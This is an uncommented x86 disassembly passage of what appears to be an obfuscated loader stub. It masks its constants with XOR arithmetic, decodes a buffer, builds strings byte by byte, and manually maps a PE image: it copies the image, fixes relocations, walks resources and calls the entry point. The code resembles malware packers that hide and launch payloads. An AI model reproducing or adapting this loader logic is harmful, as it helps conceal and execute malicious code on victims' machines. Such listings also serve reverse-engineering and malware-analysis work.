  425091:	push   DWORD PTR [ebp-0x24]
  425094:	call   DWORD PTR [eax+0x18]
  425097:	mov    eax,DWORD PTR [ebp-0x3c]
  42509a:	mov    DWORD PTR [ebp-0x34],eax
  42509d:	mov    eax,DWORD PTR [ebp-0x2c]
  4250a0:	mov    DWORD PTR [ebp-0x28],0xf89c85b0
  4250a7:	mov    DWORD PTR [ebp-0x40],eax
  4250aa:	mov    edi,0xf89c85b1
  4250af:	mov    DWORD PTR [ebp-0x30],edi
  4250b2:	mov    eax,DWORD PTR [ebp-0x28]
  4250b5:	xor    eax,ebx
  4250b7:	add    eax,esi
  4250b9:	mov    DWORD PTR [ebp-0xc],eax
  4250bc:	mov    eax,DWORD PTR [ebp-0x28]
  4250bf:	xor    eax,ebx
  4250c1:	add    eax,esi
  4250c3:	mov    DWORD PTR [ebp-0x14],eax
  4250c6:	mov    DWORD PTR [ebp-0x44],0xf89c8590
  4250cd:	mov    DWORD PTR [ebp-0x24],0xf89c85bf
  4250d4:	mov    eax,DWORD PTR [ebp-0x28]
  4250d7:	mov    ecx,DWORD PTR [ebp-0x34]
  4250da:	xor    eax,ebx
  4250dc:	add    eax,esi
  4250de:	cmp    ecx,eax
  4250e0:	je     0x4252d6
  4250e6:	jmp    0x4252b2
  4250eb:	mov    ecx,DWORD PTR [ebp-0xc]
  4250ee:	mov    eax,DWORD PTR [ebp-0x34]
  4250f1:	sub    eax,ecx
  4250f3:	mov    ecx,DWORD PTR [ebp-0x44]
  4250f6:	xor    ecx,ebx
  4250f8:	add    ecx,esi
  4250fa:	xor    edx,edx
  4250fc:	div    ecx
  4250fe:	mov    DWORD PTR [ebp-0x14],eax
  425101:	mov    eax,DWORD PTR [ebp-0x24]
  425104:	mov    ecx,DWORD PTR [ebp-0x14]
  425107:	xor    eax,ebx
  425109:	add    eax,esi
  42510b:	cmp    ecx,eax
  42510d:	jbe    0x425119
  42510f:	mov    eax,DWORD PTR [ebp-0x24]
  425112:	xor    eax,ebx
  425114:	add    eax,esi
  425116:	mov    DWORD PTR [ebp-0x14],eax
  425119:	mov    eax,DWORD PTR [ebp-0x44]
  42511c:	mov    ecx,DWORD PTR [ebp-0x14]
  42511f:	xor    eax,ebx
  425121:	add    eax,esi
  425123:	imul   eax,ecx
  425126:	mov    DWORD PTR [ebp-0x14],eax
  425129:	mov    eax,DWORD PTR [ebp-0x28]
  42512c:	mov    ecx,DWORD PTR [ebp-0x14]
  42512f:	xor    eax,ebx
  425131:	add    eax,esi
  425133:	cmp    ecx,eax
  425135:	je     0x4252a0
  42513b:	mov    eax,DWORD PTR [ebp-0x14]
  42513e:	mov    DWORD PTR [ebp-0x20],eax
  425141:	mov    eax,DWORD PTR [ebp-0xc]
  425144:	add    eax,DWORD PTR [ebp-0x40]
  425147:	mov    DWORD PTR [ebp-0x4c],0xf89c85b0
  42514e:	mov    DWORD PTR [ebp-0x14],edi
  425151:	mov    DWORD PTR [ebp-0x54],0xf89c85b2
  425158:	mov    DWORD PTR [ebp-0x1c],eax
  42515b:	mov    DWORD PTR [ebp-0x38],0xf89c85b3
  425162:	mov    DWORD PTR [ebp-0x8],edi
  425165:	mov    eax,DWORD PTR [ebp-0x4c]
  425168:	xor    eax,ebx
  42516a:	add    eax,esi
  42516c:	jmp    0x42525f
  425171:	mov    DWORD PTR [ebp-0xe4],0xf89c85bb
  42517b:	mov    DWORD PTR [ebp-0xd0],0xf89c858e
  425185:	mov    eax,DWORD PTR [ebp-0x8]
  425188:	mov    ecx,DWORD PTR [ebp-0x18]
  42518b:	xor    eax,ebx
  42518d:	add    eax,esi
  42518f:	imul   eax,ecx
  425192:	mov    ecx,DWORD PTR [ebp-0x1c]
  425195:	mov    al,BYTE PTR [eax+ecx*1]
  425198:	mov    BYTE PTR [ebp-0x1],al
  42519b:	mov    eax,DWORD PTR [ebp-0x8]
  42519e:	mov    ecx,DWORD PTR [ebp-0x18]
  4251a1:	xor    eax,ebx
  4251a3:	add    eax,esi
  4251a5:	imul   eax,ecx
  4251a8:	mov    ecx,DWORD PTR [ebp-0x54]
  4251ab:	xor    ecx,ebx
  4251ad:	add    eax,ecx
  4251af:	mov    ecx,DWORD PTR [ebp-0x1c]
  4251b2:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272ec]
  4251ba:	mov    ecx,DWORD PTR [ebp-0xe4]
  4251c0:	xor    ecx,ebx
  4251c2:	lea    eax,[ecx+eax*1+0x3272ec]
  4251c9:	movzx  ecx,BYTE PTR [ebp-0x1]
  4251cd:	xor    ecx,eax
  4251cf:	mov    BYTE PTR [ebp-0x1],cl
  4251d2:	mov    al,BYTE PTR [ebp-0x1]
  4251d5:	mov    ecx,DWORD PTR [ebp-0x8]
  4251d8:	mov    edx,DWORD PTR [ebp-0x18]
  4251db:	xor    ecx,ebx
  4251dd:	add    ecx,esi
  4251df:	imul   ecx,edx
  4251e2:	mov    edx,DWORD PTR [ebp-0x1c]
  4251e5:	mov    BYTE PTR [ecx+edx*1],al
  4251e8:	mov    eax,DWORD PTR [ebp-0x8]
  4251eb:	mov    ecx,DWORD PTR [ebp-0x18]
  4251ee:	xor    eax,ebx
  4251f0:	add    eax,esi
  4251f2:	imul   eax,ecx
  4251f5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4251f8:	mov    al,BYTE PTR [eax+ecx*1]
  4251fb:	mov    BYTE PTR [ebp-0x1],al
  4251fe:	mov    eax,DWORD PTR [ebp-0x8]
  425201:	mov    ecx,DWORD PTR [ebp-0x18]
  425204:	xor    eax,ebx
  425206:	add    eax,esi
  425208:	imul   eax,ecx
  42520b:	mov    ecx,DWORD PTR [ebp-0x14]
  42520e:	xor    ecx,ebx
  425210:	add    eax,ecx
  425212:	mov    ecx,DWORD PTR [ebp-0x1c]
  425215:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272ec]
  42521d:	mov    ecx,DWORD PTR [ebp-0xd0]
  425223:	xor    ecx,ebx
  425225:	lea    eax,[ecx+eax*1+0x3272ec]
  42522c:	movzx  ecx,BYTE PTR [ebp-0x1]
  425230:	xor    ecx,eax
  425232:	mov    BYTE PTR [ebp-0x1],cl
  425235:	mov    al,BYTE PTR [ebp-0x1]
  425238:	mov    ecx,DWORD PTR [ebp-0x8]
  42523b:	mov    edx,DWORD PTR [ebp-0x18]
  42523e:	xor    ecx,ebx
  425240:	add    ecx,esi
  425242:	imul   ecx,edx
  425245:	mov    edx,DWORD PTR [ebp-0x1c]
  425248:	mov    BYTE PTR [ecx+edx*1],al
  42524b:	mov    eax,DWORD PTR [ebp-0x38]
  42524e:	mov    ecx,DWORD PTR [ebp-0x14]
  425251:	xor    eax,ebx
  425253:	xor    ecx,ebx
  425255:	add    eax,esi
  425257:	add    ecx,esi
  425259:	imul   eax,ecx
  42525c:	add    eax,DWORD PTR [ebp-0x18]
  42525f:	mov    DWORD PTR [ebp-0x18],eax
  425262:	mov    eax,DWORD PTR [ebp-0x18]
  425265:	mov    ecx,DWORD PTR [ebp-0x20]
  425268:	cmp    ecx,eax
  42526a:	jb     0x425171
  425270:	mov    eax,DWORD PTR [ebp-0x14]
  425273:	mov    ecx,DWORD PTR [ebp-0x20]
  425276:	xor    eax,ebx
  425278:	add    eax,esi
  42527a:	imul   eax,ecx
  42527d:	mov    ecx,DWORD PTR [ebp-0x4c]
  425280:	xor    ecx,ebx
  425282:	add    ecx,esi
  425284:	or     eax,ecx
  425286:	mov    ecx,DWORD PTR [ebp-0x30]
  425289:	xor    ecx,ebx
  42528b:	add    eax,ecx
  42528d:	mov    ecx,DWORD PTR [ebp-0x30]
  425290:	xor    ecx,ebx
  425292:	add    eax,ecx
  425294:	mov    ecx,DWORD PTR [ebp-0xc]
  425297:	lea    eax,[eax+ecx*1+0x64e5d8]
  42529e:	jmp    0x4252af
  4252a0:	mov    eax,DWORD PTR [ebp-0x30]
  4252a3:	mov    ecx,DWORD PTR [ebp-0xc]
  4252a6:	xor    eax,ebx
  4252a8:	lea    eax,[eax+ecx*1+0x3272ec]
  4252af:	mov    DWORD PTR [ebp-0xc],eax
  4252b2:	mov    eax,DWORD PTR [ebp-0x30]
  4252b5:	xor    eax,ebx
  4252b7:	mov    ecx,0xffcd8d14
  4252bc:	sub    ecx,eax
  4252be:	add    ecx,DWORD PTR [ebp-0x34]
  4252c1:	mov    eax,DWORD PTR [ebp-0x30]
  4252c4:	mov    edx,DWORD PTR [ebp-0xc]
  4252c7:	xor    eax,ebx
  4252c9:	add    eax,esi
  4252cb:	imul   eax,edx
  4252ce:	cmp    eax,ecx
  4252d0:	jbe    0x4250eb
  4252d6:	push   DWORD PTR [ebp+0x8]
  4252d9:	mov    eax,DWORD PTR [ebp+0x8]
  4252dc:	push   DWORD PTR [eax+0x1cc]
  4252e2:	lea    eax,[ebp-0xd8]
  4252e8:	push   eax
  4252e9:	mov    eax,DWORD PTR [ebp+0x8]
  4252ec:	mov    eax,DWORD PTR [eax+0x1c4]
  4252f2:	push   DWORD PTR [eax]
  4252f4:	mov    eax,DWORD PTR [ebp+0x8]
  4252f7:	mov    eax,DWORD PTR [eax+0x1c0]
  4252fd:	push   DWORD PTR [eax]
  4252ff:	push   DWORD PTR [ebp-0x3c]
  425302:	push   DWORD PTR [ebp-0x2c]
  425305:	call   0x425d9c
  42530a:	mov    DWORD PTR [ebp-0x40],eax
  42530d:	mov    eax,DWORD PTR [ebp-0x10]
  425310:	mov    ecx,DWORD PTR [ebp-0x2c]
  425313:	xor    eax,ebx
  425315:	add    eax,esi
  425317:	cmp    eax,ecx
  425319:	je     0x42533a
  42531b:	mov    eax,DWORD PTR [ebp+0x8]
  42531e:	mov    ecx,DWORD PTR [ebp-0x50]
  425321:	mov    eax,DWORD PTR [eax+0x1d8]
  425327:	xor    ecx,ebx
  425329:	add    ecx,esi
  42532b:	push   ecx
  42532c:	mov    ecx,DWORD PTR [ebp-0x10]
  42532f:	xor    ecx,ebx
  425331:	add    ecx,esi
  425333:	push   ecx
  425334:	push   DWORD PTR [ebp-0x2c]
  425337:	call   DWORD PTR [eax+0x18]
  42533a:	pop    edi
  42533b:	pop    esi
  42533c:	pop    ebx
  42533d:	leave  
  42533e:	ret    0x4
  425341:	push   ebp
  425342:	mov    ebp,esp
  425344:	push   ecx
  425345:	push   ecx
  425346:	lea    eax,[ebp-0x8]
  425349:	mov    DWORD PTR [ebp-0x4],eax
  42534c:	push   esi
  42534d:	mov    esi,DWORD PTR [ebp-0x4]
  425350:	mov    eax,0xf881ba2e
  425355:	mov    DWORD PTR [esi],eax
  425357:	mov    esi,DWORD PTR [ebp-0x8]
  42535a:	cmp    esi,eax
  42535c:	pop    esi
  42535d:	jne    0x425367
  42535f:	mov    BYTE PTR [ecx+0xa],0x7a
  425363:	mov    BYTE PTR [edx+0x8],0x2f
  425367:	mov    BYTE PTR [edx+0xa],0x7a
  42536b:	mov    BYTE PTR [ecx+0x2],0x8
  42536f:	leave  
  425370:	ret    
  425371:	push   ebp
  425372:	mov    ebp,esp
  425374:	push   ecx
  425375:	push   ecx
  425376:	lea    eax,[ebp-0x8]
  425379:	mov    DWORD PTR [ebp-0x4],eax
  42537c:	mov    edx,DWORD PTR [ebp-0x4]
  42537f:	mov    eax,0xf88b0bca
  425384:	mov    DWORD PTR [edx],eax
  425386:	mov    edx,DWORD PTR [ebp-0x8]
  425389:	cmp    edx,eax
  42538b:	jne    0x42539c
  42538d:	mov    eax,DWORD PTR [ebp+0x8]
  425390:	mov    BYTE PTR [ecx+0x9],0xe
  425394:	mov    BYTE PTR [eax+0x7],0x57
  425398:	mov    BYTE PTR [ecx+0x6],0xf
  42539c:	mov    BYTE PTR [ecx+0x3],0x1e
  4253a0:	leave  
  4253a1:	ret    0x4
  4253a4:	push   ebp
  4253a5:	mov    ebp,esp
  4253a7:	push   ecx
  4253a8:	push   ecx
  4253a9:	lea    eax,[ebp-0x8]
  4253ac:	mov    DWORD PTR [ebp-0x4],eax
  4253af:	mov    edx,DWORD PTR [ebp-0x4]
  4253b2:	mov    eax,0x7e0da2e
  4253b7:	mov    DWORD PTR [edx],eax
  4253b9:	mov    edx,DWORD PTR [ebp-0x8]
  4253bc:	cmp    edx,eax
  4253be:	jne    0x4253c4
  4253c0:	mov    BYTE PTR [ecx+0x7],0x57
  4253c4:	mov    eax,DWORD PTR [ebp+0x8]
  4253c7:	mov    BYTE PTR [ecx+0x1],0x15
  4253cb:	mov    BYTE PTR [eax+0x9],0x2e
  4253cf:	leave  
  4253d0:	ret    0x4
  4253d3:	push   ebp
  4253d4:	mov    ebp,esp
  4253d6:	push   ecx
  4253d7:	push   ecx
  4253d8:	lea    eax,[ebp-0x8]
  4253db:	mov    DWORD PTR [ebp-0x4],eax
  4253de:	push   esi
  4253df:	mov    esi,DWORD PTR [ebp-0x4]
  4253e2:	mov    eax,0x7060e3f
  4253e7:	mov    DWORD PTR [esi],eax
  4253e9:	mov    esi,DWORD PTR [ebp-0x8]
  4253ec:	cmp    esi,eax
  4253ee:	pop    esi
  4253ef:	jne    0x4253fb
  4253f1:	mov    BYTE PTR [edx+0x4],0xb
  4253f5:	mov    WORD PTR [ecx+0x3],0xb1e
  4253fb:	mov    BYTE PTR [edx],0x3f
  4253fe:	leave  
  4253ff:	ret    
  425400:	push   ebp
  425401:	mov    ebp,esp
  425403:	push   ecx
  425404:	push   ecx
  425405:	lea    eax,[ebp-0x8]
  425408:	mov    DWORD PTR [ebp-0x4],eax
  42540b:	mov    edx,DWORD PTR [ebp-0x4]
  42540e:	mov    eax,0xf8870b3e
  425413:	mov    DWORD PTR [edx],eax
  425415:	mov    edx,DWORD PTR [ebp-0x8]
  425418:	cmp    edx,eax
  42541a:	jne    0x425427
  42541c:	mov    eax,DWORD PTR [ebp+0x8]
  42541f:	mov    BYTE PTR [ecx+0x8],0xf
  425423:	mov    BYTE PTR [eax+0x1],0x15
  425427:	mov    BYTE PTR [ecx+0x5],0x3
  42542b:	leave  
  42542c:	ret    0x4
  42542f:	push   esi
  425430:	mov    ecx,edi
  425432:	call   0x425400
  425437:	mov    edx,edi
  425439:	mov    ecx,esi
  42543b:	mov    BYTE PTR [esi],0x1f
  42543e:	call   0x4253d3
  425443:	push   esi
  425444:	mov    ecx,edi
  425446:	mov    BYTE PTR [esi+0x5],0x3
  42544a:	call   0x4253a4
  42544f:	push   esi
  425450:	mov    BYTE PTR [esi+0x6],0xf
  425454:	call   0x425371
  425459:	mov    BYTE PTR [esi+0x2],0x8
  42545d:	mov    edx,esi
  42545f:	jmp    0x425341
  425464:	push   ebp
  425465:	mov    ebp,esp
  425467:	push   ecx
  425468:	mov    ecx,DWORD PTR [edx+0x194]
  42546e:	push   esi
  42546f:	mov    esi,DWORD PTR [ebp+0x8]
  425472:	mov    esi,DWORD PTR [esi]
  425474:	mov    DWORD PTR [ecx],esi
  425476:	mov    ecx,DWORD PTR [edx+0x194]
  42547c:	mov    ecx,DWORD PTR [ecx]
  42547e:	mov    esi,DWORD PTR [edx+0x190]
  425484:	mov    DWORD PTR [esi],ecx
  425486:	mov    eax,DWORD PTR [edx+0x194]
  42548c:	mov    ecx,DWORD PTR [eax]
  42548e:	mov    ecx,DWORD PTR [ecx+0x3c]
  425491:	add    ecx,DWORD PTR [eax]
  425493:	mov    DWORD PTR [ebp-0x4],0xf89ca5b0
  42549a:	mov    eax,DWORD PTR [ebp-0x4]
  42549d:	movzx  ecx,WORD PTR [ecx+0x16]
  4254a1:	xor    eax,0x75108a4
  4254a6:	add    eax,0x3272ec
  4254ab:	pop    esi
  4254ac:	test   ecx,eax
  4254ae:	je     0x4254bc
  4254b0:	mov    eax,DWORD PTR [edx+0x1c8]
  4254b6:	mov    DWORD PTR [eax],0xf89c85b1
  4254bc:	leave  
  4254bd:	ret    0x4
  4254c0:	push   ebp
  4254c1:	mov    ebp,esp
  4254c3:	sub    esp,0x70
  4254c6:	and    DWORD PTR [ebp-0x20],0x0
  4254ca:	mov    DWORD PTR [ebp-0x18],0xf89cb5b0
  4254d1:	mov    DWORD PTR [ebp-0x1c],0xf89c85f0
  4254d8:	mov    DWORD PTR [ebp-0x2c],0xf89c85bc
  4254df:	mov    DWORD PTR [ebp-0x14],0xf89c85b2
  4254e6:	mov    DWORD PTR [ebp-0x2c],0xf89f05b0
  4254ed:	mov    eax,DWORD PTR [ebp+0x20]
  4254f0:	mov    eax,DWORD PTR [eax+0x194]
  4254f6:	mov    DWORD PTR [ebp-0xc],eax
  4254f9:	mov    eax,DWORD PTR [ebp+0x20]
  4254fc:	push   ebx
  4254fd:	push   esi
  4254fe:	mov    esi,DWORD PTR [eax+0x190]
  425504:	mov    eax,DWORD PTR [ebp+0x20]
  425507:	mov    eax,DWORD PTR [eax+0x18c]
  42550d:	mov    DWORD PTR [ebp-0x8],eax
  425510:	mov    eax,DWORD PTR [eax]
  425512:	push   edi
  425513:	mov    DWORD PTR [ebp-0x4],esi
  425516:	test   eax,eax
  425518:	jne    0x425525
  42551a:	push   DWORD PTR [ebp+0x1c]
  42551d:	mov    edx,DWORD PTR [ebp+0x20]
  425520:	call   0x425464
  425525:	mov    eax,DWORD PTR [esi]
  425527:	mov    ebx,DWORD PTR [esi]
  425529:	add    ebx,DWORD PTR [eax+0x3c]
  42552c:	mov    eax,DWORD PTR [ebp+0xc]
  42552f:	mov    ecx,DWORD PTR [ebp-0x8]
  425532:	mov    ecx,DWORD PTR [ecx]
  425534:	mov    esi,0x75108a4
  425539:	xor    eax,esi
  42553b:	mov    edi,0x3272ec
  425540:	add    eax,edi
  425542:	cmp    eax,ecx
  425544:	jne    0x42577c
  42554a:	mov    eax,DWORD PTR [ebp-0xc]
  42554d:	mov    eax,DWORD PTR [eax]
  42554f:	mov    DWORD PTR [ebp-0x10],eax
  425552:	mov    eax,DWORD PTR [ebx+0x50]
  425555:	mov    DWORD PTR [ebp-0x68],eax
  425558:	mov    eax,DWORD PTR [ebp-0x18]
  42555b:	xor    eax,esi
  42555d:	add    eax,edi
  42555f:	mov    DWORD PTR [ebp-0x64],eax
  425562:	mov    eax,DWORD PTR [ebp-0x14]
  425565:	and    DWORD PTR [ebp-0x6c],0x0
  425569:	xor    eax,esi
  42556b:	add    eax,edi
  42556d:	mov    DWORD PTR [ebp-0x60],eax
  425570:	lea    eax,[ebp-0x70]
  425573:	push   eax
  425574:	mov    eax,DWORD PTR [ebp+0x8]
  425577:	xor    eax,esi
  425579:	add    eax,edi
  42557b:	push   eax
  42557c:	mov    eax,DWORD PTR [ebp+0x20]
  42557f:	add    eax,0xaa
  425584:	push   eax
  425585:	mov    eax,DWORD PTR [ebp+0x20]
  425588:	mov    eax,DWORD PTR [eax+0x198]
  42558e:	mov    DWORD PTR [ebp-0x70],0x4
  425595:	push   DWORD PTR [eax]
  425597:	mov    eax,DWORD PTR [ebp+0x10]
  42559a:	call   eax
  42559c:	mov    ecx,DWORD PTR [ebp-0xc]
  42559f:	mov    ecx,DWORD PTR [ecx]
  4255a1:	mov    edx,DWORD PTR [ebp-0x8]
  4255a4:	mov    DWORD PTR [ebp-0x6c],eax
  4255a7:	mov    DWORD PTR [ebp+0x1c],eax
  4255aa:	mov    DWORD PTR [edx],ecx
  4255ac:	mov    ecx,DWORD PTR [ebp-0x4]
  4255af:	mov    DWORD PTR [ecx],eax
  4255b1:	mov    eax,DWORD PTR [ebx+0x50]
  4255b4:	mov    DWORD PTR [ebp-0x68],eax
  4255b7:	mov    eax,DWORD PTR [ebp-0x1c]
  4255ba:	xor    eax,esi
  4255bc:	add    eax,edi
  4255be:	mov    DWORD PTR [ebp-0x64],eax
  4255c1:	lea    eax,[ebp-0x20]
  4255c4:	mov    DWORD PTR [ebp-0x60],eax
  4255c7:	lea    eax,[ebp-0x70]
  4255ca:	push   eax
  4255cb:	mov    eax,DWORD PTR [ebp+0x8]
  4255ce:	xor    eax,esi
  4255d0:	add    eax,edi
  4255d2:	push   eax
  4255d3:	mov    eax,DWORD PTR [ebp+0x20]
  4255d6:	add    eax,0xee
  4255db:	push   eax
  4255dc:	mov    eax,DWORD PTR [ebp+0x20]
  4255df:	mov    eax,DWORD PTR [eax+0x198]
  4255e5:	mov    DWORD PTR [ebp-0x70],0x4
  4255ec:	push   DWORD PTR [eax]
  4255ee:	mov    eax,DWORD PTR [ebp+0x10]
  4255f1:	call   eax
  4255f3:	test   eax,eax
  4255f5:	je     0x42561a
  4255f7:	and    DWORD PTR [ebp+0xc],0x0
  4255fb:	cmp    DWORD PTR [ebx+0x50],0x0
  4255ff:	jbe    0x42561a
  425601:	mov    eax,DWORD PTR [ebp+0x1c]
  425604:	mov    ecx,DWORD PTR [ebp-0x10]
  425607:	sub    ecx,eax
  425609:	mov    dl,BYTE PTR [ecx+eax*1]
  42560c:	inc    DWORD PTR [ebp+0xc]
  42560f:	mov    BYTE PTR [eax],dl
  425611:	mov    edx,DWORD PTR [ebp+0xc]
  425614:	inc    eax
  425615:	cmp    edx,DWORD PTR [ebx+0x50]
  425618:	jb     0x425609
  42561a:	mov    edx,DWORD PTR [ebp+0x1c]
  42561d:	mov    ecx,DWORD PTR [edx+0x3c]
  425620:	add    ecx,edx
  425622:	mov    eax,DWORD PTR [ecx+0xa0]
  425628:	mov    ebx,DWORD PTR [ecx+0x28]
  42562b:	add    eax,edx
  42562d:	sub    edx,DWORD PTR [ebp-0x10]
  425630:	add    ebx,DWORD PTR [ebp+0x1c]
  425633:	mov    DWORD PTR [ebp+0xc],edx
  425636:	mov    DWORD PTR [ebp-0x2c],ecx
  425639:	mov    DWORD PTR [ebp-0x14],ebx
  42563c:	mov    DWORD PTR [ebp-0x8],0x0
  425643:	jmp    0x4256bf
  425645:	add    edx,0xfffffff8
  425648:	shr    edx,1
  42564a:	mov    DWORD PTR [ebp-0x18],edx
  42564d:	je     0x4256ab
  42564f:	lea    edx,[eax+0x8]
  425652:	mov    DWORD PTR [ebp-0x4],edx
  425655:	mov    edx,DWORD PTR [ebp-0x18]
  425658:	mov    DWORD PTR [ebp-0x18],edx
  42565b:	mov    edx,DWORD PTR [ebp-0x4]
  42565e:	movzx  edx,WORD PTR [edx]
  425661:	mov    DWORD PTR [ebp-0x24],edx
  425664:	and    edx,0xfff
  42566a:	mov    DWORD PTR [ebp-0x28],edx
  42566d:	mov    edx,DWORD PTR [ebp-0x24]
  425670:	shr    edx,0xc
  425673:	add    edx,0xffcd8d14
  425679:	xor    edx,esi
  42567b:	cmp    edx,0xf89c85b3
  425681:	jne    0x4256a2
  425683:	mov    edx,DWORD PTR [ebp-0x28]
  425686:	add    edx,DWORD PTR [ebp+0x1c]
  425689:	mov    ebx,DWORD PTR [eax]
  42568b:	cmp    DWORD PTR [ebx+edx*1],0x0
  42568f:	je     0x42569f
  425691:	mov    ecx,DWORD PTR [ebp+0xc]
  425694:	add    ecx,DWORD PTR [ebx+edx*1]
  425697:	mov    ebx,DWORD PTR [eax]
  425699:	mov    DWORD PTR [edx+ebx*1],ecx
  42569c:	mov    ecx,DWORD PTR [ebp-0x2c]
  42569f:	mov    ebx,DWORD PTR [ebp-0x14]
  4256a2:	add    DWORD PTR [ebp-0x4],0x2
  4256a6:	dec    DWORD PTR [ebp-0x18]
  4256a9:	jne    0x42565b
  4256ab:	mov    edx,DWORD PTR [ebp-0xc]
  4256ae:	add    DWORD PTR [ebp-0x8],edx
  4256b1:	mov    edx,DWORD PTR [ebp-0x8]
  4256b4:	cmp    edx,DWORD PTR [ecx+0xa4]
  4256ba:	jae    0x4256cd
  4256bc:	add    eax,DWORD PTR [ebp-0xc]
  4256bf:	mov    edx,DWORD PTR [eax+0x4]
  4256c2:	mov    DWORD PTR [ebp-0xc],edx
  4256c5:	test   edx,edx
  4256c7:	jne    0x425645
  4256cd:	mov    eax,DWORD PTR [ebp-0x10]
  4256d0:	mov    DWORD PTR [ebp-0x6c],eax
  4256d3:	mov    DWORD PTR [ebp-0x70],0x4
  4256da:	mov    eax,DWORD PTR [ecx+0x50]
  4256dd:	mov    DWORD PTR [ebp-0x68],eax
  4256e0:	mov    eax,DWORD PTR [ebp-0x1c]
  4256e3:	xor    eax,esi
  4256e5:	add    eax,edi
  4256e7:	mov    DWORD PTR [ebp-0x64],eax
  4256ea:	lea    eax,[ebp-0x20]
  4256ed:	mov    DWORD PTR [ebp-0x60],eax
  4256f0:	lea    eax,[ebp-0x70]
  4256f3:	push   eax
  4256f4:	mov    eax,DWORD PTR [ebp+0x8]
  4256f7:	xor    eax,esi
  4256f9:	add    eax,edi
  4256fb:	push   eax
  4256fc:	mov    eax,DWORD PTR [ebp+0x20]
  4256ff:	add    eax,0xee
  425704:	push   eax
  425705:	mov    eax,DWORD PTR [ebp+0x20]
  425708:	mov    eax,DWORD PTR [eax+0x198]
  42570e:	push   DWORD PTR [eax]
  425710:	mov    eax,DWORD PTR [ebp+0x10]
  425713:	call   eax
  425715:	mov    eax,DWORD PTR [ebp+0x20]
  425718:	mov    eax,DWORD PTR [eax+0x180]
  42571e:	add    eax,DWORD PTR [ebp+0xc]
  425721:	mov    ecx,DWORD PTR [ebp+0xc]
  425724:	push   DWORD PTR [ebp+0x18]
  425727:	mov    DWORD PTR [eax],ecx
  425729:	push   DWORD PTR [ebp+0x14]
  42572c:	push   DWORD PTR [ebp+0x1c]
  42572f:	call   ebx
  425731:	mov    ecx,DWORD PTR [ebp+0xc]
  425734:	add    ecx,DWORD PTR [ebp+0x20]
  425737:	lea    eax,[ebp+0x4]
  42573a:	mov    DWORD PTR [ebp+0x20],ecx
  42573d:	mov    ecx,DWORD PTR [ebp+0x20]
  425740:	mov    ecx,DWORD PTR [ebp+0x20]
  425743:	mov    edx,DWORD PTR [ecx+0x190]
  425749:	mov    ecx,DWORD PTR [ebp+0x20]
  42574c:	mov    ecx,DWORD PTR [ecx+0x18c]
  425752:	mov    esi,DWORD PTR [ecx]
  425754:	cmp    DWORD PTR [eax],esi
  425756:	jb     0x425777
  425758:	mov    esi,DWORD PTR [edx]
  42575a:	mov    edi,DWORD PTR [edx]
  42575c:	mov    esi,DWORD PTR [esi+0x3c]
  42575f:	lea    esi,[edi+esi*1+0x50]
  425763:	mov    edi,DWORD PTR [ecx]
  425765:	add    edi,DWORD PTR [esi]
  425767:	cmp    DWORD PTR [eax],edi
  425769:	jae    0x425777
  42576b:	mov    esi,DWORD PTR [ecx]
  42576d:	mov    ecx,DWORD PTR [eax]
  42576f:	mov    edx,DWORD PTR [edx]
  425771:	sub    ecx,esi
  425773:	add    edx,ecx
  425775:	mov    DWORD PTR [eax],edx
  425777:	mov    eax,DWORD PTR [ebp+0xc]
  42577a:	jmp    0x42577e
  42577c:	xor    eax,eax
  42577e:	pop    edi
  42577f:	pop    esi
  425780:	pop    ebx
  425781:	leave  
  425782:	ret    0x1c
  425785:	push   ebp
  425786:	mov    ebp,esp
  425788:	sub    esp,0x1c
  42578b:	push   esi
  42578c:	mov    esi,eax
  42578e:	mov    eax,DWORD PTR [ecx+0x190]
  425794:	cmp    DWORD PTR [eax],0x0
  425797:	je     0x4258a7
  42579d:	test   edx,edx
  42579f:	je     0x4258a7
  4257a5:	test   esi,esi
  4257a7:	je     0x4258a7
  4257ad:	mov    eax,DWORD PTR [esi+0x88]
  4257b3:	test   eax,eax
  4257b5:	je     0x4258a2
  4257bb:	cmp    DWORD PTR [esi+0x8c],0x10
  4257c2:	je     0x4258a2
  4257c8:	cmp    DWORD PTR [esi+0x34],edx
  4257cb:	je     0x4258a2
  4257d1:	mov    esi,DWORD PTR [ecx+0x18c]
  4257d7:	and    DWORD PTR [ebp-0x10],0x0
  4257db:	mov    ecx,edx
  4257dd:	sub    ecx,DWORD PTR [esi]
  4257df:	add    eax,edx
  4257e1:	movzx  edx,WORD PTR [eax+0xc]
  4257e5:	mov    DWORD PTR [ebp-0x1c],ecx
  4257e8:	movzx  ecx,WORD PTR [eax+0xe]
  4257ec:	add    ecx,edx
  4257ee:	je     0x4258a2
  4257f4:	lea    ecx,[eax+0x14]
  4257f7:	push   ebx
  4257f8:	mov    DWORD PTR [ebp-0x18],ecx
  4257fb:	mov    esi,0x7fffffff
  425800:	push   edi
  425801:	test   DWORD PTR [ecx],esi
  425803:	je     0x425884
  425805:	mov    edx,DWORD PTR [ecx]
  425807:	and    DWORD PTR [ebp-0xc],0x0
  42580b:	and    edx,esi
  42580d:	add    edx,eax
  42580f:	movzx  edi,WORD PTR [edx+0xe]
  425813:	movzx  ebx,WORD PTR [edx+0xc]
  425817:	add    edi,ebx
  425819:	je     0x425884
  42581b:	lea    ecx,[edx+0x14]
  42581e:	mov    DWORD PTR [ebp-0x14],ecx
  425821:	test   DWORD PTR [ecx],esi
  425823:	je     0x425866
  425825:	mov    ecx,DWORD PTR [ecx]
  425827:	and    DWORD PTR [ebp-0x8],0x0
  42582b:	and    ecx,esi
  42582d:	add    ecx,eax
  42582f:	movzx  edi,WORD PTR [ecx+0xe]
  425833:	movzx  ebx,WORD PTR [ecx+0xc]
  425837:	add    edi,ebx
  425839:	je     0x425866
  42583b:	lea    edi,[ecx+0x14]
  42583e:	mov    DWORD PTR [ebp-0x4],edi
  425841:	mov    edi,DWORD PTR [ebp-0x4]
  425844:	mov    edi,DWORD PTR [edi]
  425846:	test   edi,edi
  425848:	je     0x425850
  42584a:	mov    ebx,DWORD PTR [ebp-0x1c]
  42584d:	add    DWORD PTR [edi+eax*1],ebx
  425850:	movzx  edi,WORD PTR [ecx+0xe]
  425854:	movzx  ebx,WORD PTR [ecx+0xc]
  425858:	inc    DWORD PTR [ebp-0x8]
  42585b:	add    DWORD PTR [ebp-0x4],0x8
  42585f:	add    edi,ebx
  425861:	cmp    DWORD PTR [ebp-0x8],edi
  425864:	jb     0x425841
  425866:	movzx  edi,WORD PTR [edx+0xe]
  42586a:	movzx  ebx,WORD PTR [edx+0xc]
